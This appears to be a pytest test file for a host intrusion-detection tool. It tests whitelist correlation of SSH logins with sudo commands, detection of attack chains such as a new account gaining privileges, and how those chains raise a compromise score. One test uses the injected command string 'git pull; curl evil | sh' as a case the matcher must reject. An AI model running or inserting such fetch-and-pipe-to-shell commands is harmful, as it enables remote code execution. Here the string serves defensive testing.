"""Correlation (PR 2.3): whitelist conditions on partner events, and attack
chains that earn a bonus in the score."""

import math
import time

import pytest
from test_snapshot import add_bundle, host_records

from checker.assess import analyze
from checker.correlate import (
    CHAINS,
    command_matches,
    correlated,
    find_chains,
    parse_duration,
)
from checker.events import Event
from checker.scoring import logit, score
from checker.whitelist import Correlation, Layer, WhitelistError, read_layer

T = "2026-11-01T10:00:{:02d}+00:00"


def ev(kind, second, own=False, **fields):
    at = T.format(second) if second < 60 else f"2026-11-0{1 + second // 86400}T10:00:00+00:00"
    return Event(at, at, "auth_log:/var/log/auth.log", kind, fields, own_session=own)


def login(user="deploy", second=0, address="203.0.113.9"):
    return ev("ssh.login.accepted", second, user=user, address=address)


def sudo(command, user="deploy", second=5, own=False):
    return ev("sudo.command", second, own=own, user=user, command=command, runas="deploy")


def condition(**fields):
    return Correlation.model_validate({"event": "sudo.command", "within": "30s"} | fields)


def finding_for(*indices, check="ssh.login", **extra):
    return {
        "check": check,
        "variant": "new_address",
        "category": "compromise indicator",
        "band": "medium",
        "title": "t",
        "summary": "s",
        "entities": ["address:203.0.113.9", "account:deploy"],
        "evidence": [{"event": i} for i in indices],
        **extra,
    }


# --- the pieces ----------------------------------------------------------------------------


def test_durations():
    assert parse_duration("30s").total_seconds() == 30
    assert parse_duration("2h").total_seconds() == 7200
    for bad in ("30", "0s", "-5m", "1w", "1.5h", ""):
        with pytest.raises(ValueError):
            parse_duration(bad)


def test_command_patterns_are_whole_and_never_backtrack():
    assert command_matches("/usr/bin/git -C /var/www/* pull", "/usr/bin/git -C /var/www/app pull")
    assert not command_matches("/usr/bin/git pull", "/usr/bin/git pull; curl evil | sh")
    assert command_matches("*git pull", "sudo -u deploy git pull")
    start = time.monotonic()
    assert not command_matches("*a*a*a*a*a*a*b", "a" * 2000)
    assert time.monotonic() - start < 1


# --- whitelist conditions ---------------------------------------------------------------------


def test_a_login_followed_by_the_deploy_command_is_correlated():
    events = [login(), sudo("/usr/bin/git pull")]
    assert correlated(condition(command="*git pull"), finding_for(0), events)


@pytest.mark.parametrize(
    ("events", "why"),
    [
        ([login(), sudo("/usr/bin/git pull", user="eve")], "another account"),
        ([login(), sudo("/usr/bin/git pull", second=45)], "too late"),
        ([login(second=5), sudo("/usr/bin/git pull", second=0)], "before, not after"),
        ([login(), sudo("/usr/bin/git pull", own=True)], "the tool's own"),
        ([login(), sudo("/bin/bash")], "another command"),
        ([login()], "no partner"),
    ],
)
def test_no_partner_no_correlation(events, why):
    assert not correlated(condition(command="*git pull"), finding_for(0), events), why


def test_every_cited_event_needs_its_partner():
    events = [login(), sudo("/usr/bin/git pull"), login(second=40)]
    assert not correlated(condition(command="*git pull"), finding_for(0, 2), events)
    events.append(sudo("/usr/bin/git pull", second=50))
    assert correlated(condition(command="*git pull"), finding_for(0, 2), events)


def test_direction_and_address():
    events = [sudo("/usr/bin/git pull", second=0), login(second=5)]
    assert correlated(condition(command="*git pull", direction="before"), finding_for(1), events)
    events = [login(), ev("ssh.login.accepted", 3, user="deploy", address="198.51.100.1")]
    same = Correlation.model_validate(
        {"event": "ssh.login.accepted", "within": "10s", "same": ["address"]}
    )
    assert not correlated(same, finding_for(0), events)  # another address; not itself
    events.append(ev("ssh.login.accepted", 4, user="deploy", address="203.0.113.9"))
    assert correlated(same, finding_for(0), events)


def test_no_events_or_no_cited_events_never_correlate():
    assert not correlated(condition(), finding_for(0), None)
    assert not correlated(condition(), finding_for(), [login(), sudo("x")])


RULE = """
rules:
  - id: deploy-after-login
    match:
      check: ssh.login
      variant: new_address
      correlated_with: {correlation}
    reason: "Deploys log in from anywhere, then pull."
    owner: john
    expires: never
"""


@pytest.mark.parametrize(
    ("correlation", "message"),
    [
        ("{event: git.pull, within: 30s, command: '*git pull'}", "no event type"),
        ("{event: sudo.command, within: 2d, command: '*git pull'}", "at most 1d"),
        ("{event: sudo.command, within: 30s, command: '**'}", "name the command"),
        ("{event: sudo.command, within: 30s, same: [], command: '*git pull'}", "same"),
        ("{event: sudo.command, within: 30s}", "broad: true"),
    ],
)
def test_invalid_conditions_are_refused(tmp_path, correlation, message):
    path = tmp_path / "w.yaml"
    path.write_text(RULE.format(correlation=correlation))
    with pytest.raises(WhitelistError, match=message):
        read_layer(path)


def test_a_rule_with_a_condition_suppresses_only_when_it_holds(tmp_path):
    path = tmp_path / "w.yaml"
    path.write_text(
        RULE.format(correlation="{event: sudo.command, within: 30s, command: '*git pull'}")
    )
    from checker.whitelist import build

    merged = build([("host h", str(path), read_layer(path))])
    events = [login(), sudo("/usr/bin/git pull"), login("deploy", 40)]
    pulled, alone = finding_for(0), finding_for(2)
    merged.apply([pulled, alone], events=events)
    assert pulled["suppressed_by"]["rule"] == "deploy-after-login"
    assert "suppressed_by" not in alone
    merged.apply([pulled], events=None)  # no events: nothing to correlate with
    assert "suppressed_by" not in pulled


# --- chains ------------------------------------------------------------------------------


def f(check, account, first_seen=None, new=False, **extra):
    return {
        "check": check,
        "category": "compromise indicator",
        "band": "high",
        "title": check,
        "summary": account,
        "entities": [f"account:{account}"],
        "first_seen": first_seen,
        "new": new,
        **extra,
    }


DAY0 = "2026-11-01T10:00:00+00:00"


LATER = DAY0.replace("10:00", "11:00")


def escalation(login_at=LATER, **sudo_extra):
    findings = [
        f("account.log_changes", "eve", DAY0),
        f("sudo.rules", "eve", new=True, **sudo_extra),
    ]
    events = [Event(login_at, login_at, "x", "ssh.login.accepted", {"user": "eve"})]
    return findings, events


def test_new_account_given_privilege_then_used():
    findings, events = escalation()
    [chain] = find_chains(findings, events)
    assert chain["chain"] == "new-account-escalated-used" and chain["account"] == "eve"
    assert chain["findings"] == [0, 1] and chain["events"] == [0]


@pytest.mark.parametrize(
    ("change", "why"),
    [
        ({"login_at": "2026-11-01T09:00:00+00:00"}, "the login came before the account"),
        ({"login_at": "2026-11-09T10:00:00+00:00"}, "more than 7 days later"),
        ({"new": False}, "the privilege wasn't new since the previous bundle"),
        ({"suppressed_by": {"rule": "x"}}, "the privilege was explained"),
    ],
)
def test_broken_chains_earn_nothing(change, why):
    login_at = change.pop("login_at", LATER)
    findings, events = escalation(login_at)
    findings[1].update(change)
    assert find_chains(findings, events) == [], why


def test_a_guessed_login_then_a_new_key():
    findings = [
        f("ssh.guessed", "root", DAY0),
        f("ssh.authorized_keys", "root", new=True),
    ]
    [chain] = find_chains(findings, [])
    assert chain["chain"] == "guessed-then-entrenched"
    findings[1]["entities"] = ["account:other"]
    assert find_chains(findings, []) == []


def test_each_chain_counts_once_however_many_accounts_complete_it():
    findings = [
        f("ssh.guessed", "root", DAY0),
        f("ssh.authorized_keys", "root", new=True),
        f("ssh.guessed", "admin", DAY0),
        f("ssh.authorized_keys", "admin", new=True),
    ]
    chains = find_chains(findings, [])
    assert [c["account"] for c in chains] == ["admin"]


def test_a_chain_adds_its_bonus_to_the_score():
    findings, events = escalation()
    chains = find_chains(findings, events)
    alone = score([dict(x) for x in findings], 0.02)
    together = score([dict(x) for x in findings], 0.02, chains)
    assert together["log_odds"] - alone["log_odds"] == pytest.approx(math.log(5), abs=1e-3)
    [bonus] = [c for c in together["contributors"] if c["finding"] is None]
    assert bonus["check"] == "chain:new-account-escalated-used" and bonus["ratio"] == 5.0
    assert together["log_odds"] > logit(0.02)


def test_chains_are_data():
    assert {c.id for c in CHAINS} == {"new-account-escalated-used", "guessed-then-entrenched"}
    assert all(c.ratio > 1 for c in CHAINS)


def test_an_analysis_records_its_chains(home):
    _, store, identity, config = home
    add_bundle(home, "b1", 0, host_records())
    assessment = analyze(store, "web01", identity, config.recipients)
    assert assessment["score"]["chains"] == []


def test_sudo_rules_name_who_they_grant_to():
    from checker.checks.accounts import _sudo_who

    assert _sudo_who("eve ALL=(ALL) NOPASSWD: ALL") == ["account:eve"]
    assert _sudo_who("%wheel ALL=(ALL) ALL") == ["group:wheel"]
    assert _sudo_who("Defaults env_reset") == []
    assert _sudo_who("ADMINS ALL=(ALL) ALL") == []  # an alias names no one plainly
    assert _sudo_who("eve,bob ALL=(ALL) ALL") == []


def test_layers_still_load_without_conditions():
    assert Layer.model_validate({}).rules == []
